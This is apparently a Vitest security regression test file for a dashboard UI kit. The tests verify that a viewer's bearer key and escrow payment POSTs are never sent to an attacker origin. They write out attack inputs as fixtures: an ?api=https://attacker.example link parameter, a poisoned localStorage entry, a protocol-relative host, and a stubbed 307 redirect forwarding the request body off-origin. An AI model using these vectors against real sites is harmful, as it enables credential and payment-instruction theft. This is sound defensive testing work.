/**
 * @vitest-environment jsdom
 *
 * On-Ramp — origin hard-bind for the viewer's credential AND for writes.
 *
 * The attack these tests close: an artifact is shared as a LINK, and the link
 * carries `?api=https://attacker.example`. At 42fa52d4 the kit treated a query
 * param and a localStorage entry as "the viewer's own choice" and attached the
 * viewer's `Authorization: Bearer` key to that base — and `resolveApiBase()`
 * (pcc-ui.js:188) PERSISTS the query value into localStorage itself, so every
 * later, unrelated, perfectly benign artifact kept leaking to the same origin.
 *
 * Two further holes closed here:
 *   - withholding the key while STILL POSTing is not containment: the money
 *     instruction (escrowId + amount) still left the browser. A write to a base
 *     the viewer's own context does not vouch for is now not sent at all.
 *   - every fetch defaulted to redirect:'follow', so a 307/308 re-issued the
 *     request — method and body preserved — at whatever origin the redirect
 *     named. Credentialed requests and all writes now use redirect:'error'.
 *
 * Every test in this file FAILS against 42fa52d4 (see
 * ai/research/uikit-origin-bind-patch-log.md for the raw before/after runs).
 * The kit is a classic-script IIFE; its source is executed in the jsdom global.
 */

import { describe, it, expect, beforeEach } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import path from "node:path";

const here = path.dirname(fileURLToPath(import.meta.url));
const kitSrc = readFileSync(
  path.resolve(here, "../../../../apps/dashboard/public/ui-kit/v1/pcc-ui.js"),
  "utf8",
);

const ATTACKER = "https://attacker.example";
const CANONICAL = "https://capability.network";
const KEY = "pcc_live_secret";

type FetchCall = {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: unknown;
  redirect?: string;
};

/** Recording fetch stub (jsdom ships no fetch). Answers everything 200/JSON. */
function installFetch(): FetchCall[] {
  const calls: FetchCall[] = [];
  (window as unknown as { fetch: unknown }).fetch = (
    url: unknown,
    init?: { method?: string; headers?: Record<string, string>; body?: unknown; redirect?: string },
  ) => {
    calls.push({
      url: String(url),
      method: (init && init.method) || "GET",
      headers: (init && (init.headers as Record<string, string>)) || {},
      body: init && init.body,
      redirect: init && init.redirect,
    });
    return Promise.resolve({
      ok: true,
      status: 200,
      redirected: false,
      url: String(url),
      headers: { get: () => null },
      json: () => Promise.resolve({ v: 1, amount: 21.99, currency: "USDC" }),
    });
  };
  return calls;
}

function boot(manifestJson: string) {
  document.documentElement.removeAttribute("data-theme");
  document.head.innerHTML = "";
  document.body.innerHTML = "";
  (window as unknown as { __PCC_UI_BOOTED__?: boolean }).__PCC_UI_BOOTED__ = false;
  const main = document.createElement("main");
  main.id = "pcc-root";
  document.body.appendChild(main);
  const mNode = document.createElement("script");
  mNode.type = "application/json";
  mNode.id = "pcc-manifest";
  mNode.textContent = manifestJson;
  document.body.appendChild(mNode);
  // eslint-disable-next-line no-eval
  (0, eval)(kitSrc);
}

const flush = () => new Promise((r) => setTimeout(r, 0));

/**
 * An approval window: one READ (the binding GET, fired on boot) and one MONEY
 * WRITE (the Approve button — an approval window IS the money gate, so Approve
 * dispatches the POST directly). One manifest exercises both halves of the
 * contract: the key must not ride the read, the write must not leave at all.
 */
const moneyManifest = (apiBase?: string) =>
  JSON.stringify({
    csd: "pcc://artifacts/dashboard/v1",
    title: "Approve",
    ...(apiBase ? { api_base: apiBase } : {}),
    sections: [{ windows: [{
      kind: "approval",
      binding: { path: "/api/escrow/esc-1" },
      approve: {
        id: "fund",
        label: "Approve fund",
        kind: "post",
        path: "/api/escrow/fund",
        body: { escrowId: "esc-1", amount: 21.99 },
      },
    }] }],
  });

const metricManifest = (apiBase?: string) =>
  JSON.stringify({
    csd: "pcc://artifacts/dashboard/v1",
    title: "M",
    ...(apiBase ? { api_base: apiBase } : {}),
    sections: [{ windows: [{ kind: "metric", label: "M", binding: { path: "/api/x" }, format: "int" }] }],
  });

const clickApprove = () =>
  (Array.from(document.querySelectorAll(".pcc-actionbar .pcc-btn")).find(
    (b) => b.textContent!.indexOf("Approve") === 0,
  ) as HTMLButtonElement).click();

/** Every assertion the four origin paths share. */
async function expectOriginClosed(calls: FetchCall[], hostilePrefix: string) {
  await flush();

  // 1. The READ may still go out (existing product behaviour for an off-origin
  //    base) — but it must be UNCREDENTIALED.
  const reads = calls.filter((c) => c.url.indexOf(hostilePrefix) === 0);
  expect(reads.length).toBeGreaterThan(0); // it really did target the hostile base
  for (const r of reads) expect(r.headers["Authorization"]).toBeUndefined();

  // 2. The money WRITE must not leave at all. Withholding the key is not
  //    containment while the instruction still ships.
  clickApprove();
  await flush();
  expect(calls.filter((c) => c.method === "POST").length).toBe(0);

  // 3. No request anywhere carries the money instruction or the key.
  for (const c of calls) {
    expect(String(c.body ?? "")).not.toContain("21.99");
    expect(JSON.stringify(c.headers)).not.toContain(KEY);
  }

  // 4. The refusal is surfaced, not silent.
  expect(document.body.textContent!.toLowerCase()).toContain("refused");
}

describe("pcc-ui kit — origin hard-bind: the viewer key and every write are bound to the PCC origin", () => {
  beforeEach(() => {
    window.sessionStorage.clear();
    window.localStorage.clear();
    window.history.replaceState(null, "", "/");
    delete (window as unknown as { fetch?: unknown }).fetch;
  });

  it("?api= in a SHARED LINK is attacker input: no key on the read, no money write at all", async () => {
    window.history.replaceState(null, "", "/a/slug?api=" + ATTACKER);
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(moneyManifest());
    await expectOriginClosed(calls, ATTACKER);
  });

  it("a PERSISTED pcc.apiBase poisons later clean artifacts: no key on the read, no money write at all", async () => {
    // No ?api= on THIS url and a perfectly benign manifest — the poisoning was
    // written by an earlier link (pcc-ui.js:188 persists ?api= itself).
    window.localStorage.setItem("pcc.apiBase", ATTACKER);
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(moneyManifest());
    await expectOriginClosed(calls, ATTACKER);
  });

  it("manifest api_base off-origin: key already withheld at 42fa52d4, but the money write must ALSO stop", async () => {
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(moneyManifest(ATTACKER));
    await expectOriginClosed(calls, ATTACKER);
  });

  it("protocol-relative //host resolves to a different ORIGIN: no key on the read, no money write at all", async () => {
    window.history.replaceState(null, "", "/a/slug?api=//attacker.example");
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(moneyManifest());
    await expectOriginClosed(calls, "//attacker.example");
  });

  it("an unparseable base fails CLOSED (no key)", async () => {
    window.history.replaceState(null, "", "/a/slug?api=" + encodeURIComponent("http://["));
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(metricManifest());
    await flush();
    for (const c of calls) expect(c.headers["Authorization"]).toBeUndefined();
  });

  it("origin equality, not string equality: a canonical-origin base with a PATH is still the PCC origin", async () => {
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(metricManifest(CANONICAL + "/v1"));
    await flush();
    const get = calls.find((c) => c.url.indexOf(CANONICAL) === 0);
    expect(get).toBeTruthy();
    expect(get!.headers["Authorization"]).toBe("Bearer " + KEY);
  });
});

describe("pcc-ui kit — a credentialed request may not follow a redirect off-origin", () => {
  beforeEach(() => {
    window.sessionStorage.clear();
    window.localStorage.clear();
    window.history.replaceState(null, "", "/");
    delete (window as unknown as { fetch?: unknown }).fetch;
  });

  /**
   * Models the browser's own 307 handling, because jsdom has no fetch:
   *   - redirect:'follow' (the default at 42fa52d4) → the browser re-issues the
   *     request at the redirect target. A 307/308 preserves method AND body, so
   *     the money instruction arrives at the attacker origin. (A spec-current
   *     browser does strip `Authorization` on a CROSS-ORIGIN redirect — so the
   *     stub strips it too. The leak proven here is the BODY, which no browser
   *     version protects, and that alone is the money instruction.)
   *   - redirect:'error' → the browser never issues the follow-up request and
   *     rejects. Nothing whatsoever reaches the redirect target.
   */
  function installRedirectingFetch(): FetchCall[] {
    const calls: FetchCall[] = [];
    const impl = (
      url: unknown,
      init?: { method?: string; headers?: Record<string, string>; body?: unknown; redirect?: string },
    ): Promise<unknown> => {
      const call: FetchCall = {
        url: String(url),
        method: (init && init.method) || "GET",
        headers: (init && (init.headers as Record<string, string>)) || {},
        body: init && init.body,
        redirect: init && init.redirect,
      };
      calls.push(call);

      // The redirect TARGET answers normally.
      if (call.url.indexOf(ATTACKER) === 0) {
        return Promise.resolve({
          ok: true, status: 200, redirected: true, url: call.url,
          headers: { get: () => null }, json: () => Promise.resolve({ ok: true }),
        });
      }

      // The first hop answers 307 → ATTACKER.
      if (call.redirect === "error") return Promise.reject(new TypeError("Failed to fetch"));
      if (call.redirect === "manual") {
        return Promise.resolve({
          ok: false, status: 0, redirected: false, url: "", type: "opaqueredirect",
          headers: { get: () => null }, json: () => Promise.resolve({}),
        });
      }
      const forwarded = { ...(init || {}) } as Record<string, unknown>;
      const h = { ...(call.headers || {}) } as Record<string, string>;
      delete h["Authorization"]; // spec: dropped on a cross-origin redirect
      forwarded.headers = h;
      return impl(ATTACKER + "/api/escrow/fund", forwarded as never);
    };
    (window as unknown as { fetch: unknown }).fetch = impl;
    return calls;
  }

  it("a same-origin money POST that is 307'd off-origin delivers neither the credential nor the body", async () => {
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installRedirectingFetch();
    boot(moneyManifest()); // same-origin base → correctly credentialed, write allowed
    await flush();
    clickApprove();
    await flush();

    const atAttacker = calls.filter((c) => c.url.indexOf(ATTACKER) === 0);
    expect(atAttacker).toEqual([]); // nothing reached the redirect target at all
    for (const c of atAttacker) {
      expect(String(c.body ?? "")).not.toContain("21.99");
      expect(JSON.stringify(c.headers)).not.toContain(KEY);
    }
  });

  it("a credentialed read is issued with redirect:'error' (prevention, not post-hoc detection)", async () => {
    window.sessionStorage.setItem("pcc.key", KEY);
    const calls = installFetch();
    boot(metricManifest());
    await flush();
    const get = calls.find((c) => c.headers["Authorization"] === "Bearer " + KEY);
    expect(get).toBeTruthy();
    expect(get!.redirect).toBe("error");
  });
});
